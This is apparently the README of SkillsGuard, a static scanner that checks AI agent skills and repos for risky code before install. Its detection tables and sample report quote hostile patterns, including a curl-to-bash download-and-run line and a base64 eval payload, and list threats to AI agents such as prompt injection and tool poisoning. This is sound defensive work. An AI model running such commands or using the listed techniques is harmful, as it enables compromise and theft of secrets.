# SkillsGuard

**Pre-install security scanner for AI skills, agent tools, and plugin repos — with deep threat analysis for SKILL.md-based agent skill packages.**

> "Vibes aren't a security model."

SkillsGuard gives developers an explainable risk report **before code is run**. It combines fast, broad repo-level scanning with deep AI-skill-specific threat analysis — like a nutrition label for code.

---

## How It Works

SkillsGuard runs two layers of analysis:

**Layer 1 — Repo-Level Scan** (runs on everything, no API key needed)
- Detects red flags: `curl | bash`, base64 exec, npm postinstall hooks, persistence mechanisms, unpinned GitHub Actions
- Maps capabilities: shell execution, network egress, filesystem writes, env var access, sensitive path reads
- Flags trust gaps: opaque binaries, minified/packed code, unparseable config files
- Produces a 0–10 risk score with a labeled breakdown

**Layer 2 — Deep Skill Analysis** (auto-triggers when `SKILL.md` is found)
- Pattern engine: 80+ YARA and regex security rules across 12+ threat categories
- Dataflow engine: AST-based taint tracking through Python source (sources → sinks)
- LLM engine (opt-in): GPT-4o semantic analysis that understands code intent beyond patterns
- All findings mapped to the AITech threat taxonomy

---

## Installation

```bash
# Clone or navigate to the project
cd SkillsGuardApp

# Install in development mode
pip install -e .

# For LLM engine support (optional)
pip install -e ".[llm]"
```

### Requirements

- Python 3.10+
- PyYAML (`pyyaml`)
- python-dotenv (`python-dotenv`)
- python-frontmatter (`python-frontmatter`) — for SKILL.md parsing

Optional (for LLM engine):
- `openai`
- `litellm`

---

## Setup

### Basic (no API key needed)

Works out of the box. Pattern matching, dataflow analysis, and all repo-level scanning run locally.

### With LLM Engine (optional)

Create a `.env` file in the project root:

```
OPEN_AI_API=sk-proj-your-openai-api-key-here
```

Then use the `--llm` flag when scanning.

---

## Usage

### Scan a local directory

```bash
skillguard scan /path/to/repo
```

### Scan a GitHub repo

```bash
skillguard scan github.com/owner/repo
```

### Scan with purpose context

```bash
skillguard scan ./my-skill --purpose agent_skill
```

Purpose affects which capabilities are flagged as "expected" vs "unexpected". Available purposes: `unknown`, `agent_skill`, `formatter`, `linter`, `build_tool`, `devops`, `cli`, `library`.

### Enable LLM semantic analysis

```bash
skillguard scan ./my-skill --llm
```

### Force deep analysis (even without SKILL.md)

```bash
skillguard scan ./some-repo --deep
```

### Skip deep analysis entirely

```bash
skillguard scan ./my-skill --no-deep
```

### JSON output

```bash
skillguard scan ./my-skill --format json
```

### Install wrapper (scan then install)

```bash
# Dry-run: shows report and asks for confirmation
skillguard install ./my-skill --cmd "npm install"

# Auto-confirm
skillguard install ./my-skill --cmd "npm install" --yes
```

---

## What It Detects

### Red Flags (high weight)

| Code | Description |
|------|-------------|
| `CURL_PIPE_SH` | curl/wget piped to bash/sh |
| `DOWNLOAD_EXEC` | Runtime download + execute |
| `POSTINSTALL_EXEC` | npm preinstall/postinstall lifecycle scripts |
| `BASE64_EXEC` | Obfuscated execution via base64 + eval |
| `EVAL_DYNAMIC` | eval() with dynamic input |
| `PERSISTENCE` | cron, systemd, launchd, registry writes |
| `GHA_USES_REMOTE` | Remote GitHub Action usage |
| `GHA_USES_UNPINNED` | Unpinned GitHub Actions (tag/branch vs SHA) |
| `GHA_USES_DOCKER` | docker:// GitHub Actions |
| `GHA_RUN_SHELL` | Suspicious shell commands in CI workflows |

### Capabilities (neutral, context-dependent)

| Code | Description |
|------|-------------|
| `SHELL_EXEC` | Shell/subprocess execution |
| `NETWORK_EGRESS` | Outbound network requests |
| `FS_WRITE` | Filesystem write operations |
| `ENV_READ` | Environment variable access |
| `SENSITIVE_PATH_READ` | Access to ~/.ssh, ~/.aws, /etc/passwd, etc. |

### Inspectability (trust gaps)

| Code | Description |
|------|-------------|
| `OPAQUE_BINARY` | Binary files that can't be inspected |
| `PACKED_OR_MINIFIED` | Minified/packed code |
| `LOCKFILE_PRESENT` | Lockfiles with potential hidden install scripts |
| `PARSE_ERROR` | Files that fail to parse |

### Skill Threats (deep analysis, SKILL.md targets only)

| Category | Examples |
|----------|---------|
| Prompt Injection | Instruction override, delimiter injection |
| Data Exfiltration | Tainted data flowing to network sinks |
| Tool Poisoning | Corrupted tool metadata or descriptions |
| Command Injection | Shell command injection via skill scripts |
| Credential Harvesting | Patterns accessing keys, tokens, secrets |
| Autonomy Abuse | Unbounded retries, missing confirmation gates |
| Obfuscation | Hidden payloads, encoded execution |
| Social Engineering | Vague descriptions, keyword baiting, brand impersonation |

---

## Risk Scoring

- **Scale**: 0.0 – 10.0 (logarithmic, diminishing returns)
- **Labels**: LOW (0–2), MEDIUM (2–5), HIGH (5–8), CRITICAL (8–10)
- **Weights**: Red Flags & Skill Threats = 3x, Inspectability = 2x, Capabilities = 1x
- **Top Reasons**: Top 5 findings ranked by severity × confidence

---

## Example Output

```
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  SkillsGuard Risk Report
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Repo:      risky-repo
  Purpose:   unknown
  Scanned:   4 files in 0.0s

  Risk Level: ██████████  CRITICAL (10.0/10)

  Red Flags:
  ✗ CURL_PIPE_SH             install.sh:7
    curl -fsSL https://cdn.example.com/setup | bash
  ✗ BASE64_EXEC              src/loader.js:7
    eval(atob(encoded_payload));
  ✗ PERSISTENCE              install.sh:14
    sudo systemctl enable agent-toolkit.service

  Capabilities:
  ● SHELL_EXEC               1 file
  ● ENV_READ                 1 file

  Skill Threats:
  ✗ YARA_prompt_injection    SKILL.md:12
    Instruction override attempt detected

  ⓘ Static analysis only — code was never executed.
```

---

## Project Structure

```
SkillsGuardApp/
  pyproject.toml          Project config and CLI entry point
  .env                    API keys (gitignored)
  skillguard/             User-facing CLI and repo-level scanner
    cli.py                CLI argument parsing and commands
    scanner.py            Scan orchestrator (Layer 1 + Layer 2)
    deep_scan.py          Bridge to sgscanner deep analysis
    loader.py             File discovery and categorization
    models.py             Finding, ScanResult, enums
    reporter.py           Pretty and JSON output formatters
    scoring.py            Risk score computation
    rules/                Detection rule modules
      red_flags.py        Red flag detection (10 rules)
      capabilities.py     Capability detection (5 rules)
      inspectability.py   Trust gap detection (4 rules)
      github_actions.py   GitHub Actions workflow parser
  sgscanner/              Deep analysis engine for AI skills
    engines/              Scan engines (pattern, dataflow, LLM, meta, etc.)
    pipeline/             Pipeline orchestrator with phases and context
    models/               Issue, ScanOutcome, RiskLevel, ThreatClass
    llm/                  Unified LLM client (prompt, request, parse)
    taxonomy/             AITech threat taxonomy mappings
    static_analysis/      AST parsing, taint tracking, dataflow analysis
    rules/                YARA and regex security patterns
    reports/              JSON, Markdown, SARIF, table reporters
  tests/                  Test suites for both packages
```

---

## Disclaimer

SkillsGuard performs **static analysis only** — code is never executed. This is decision support, not malware detection.
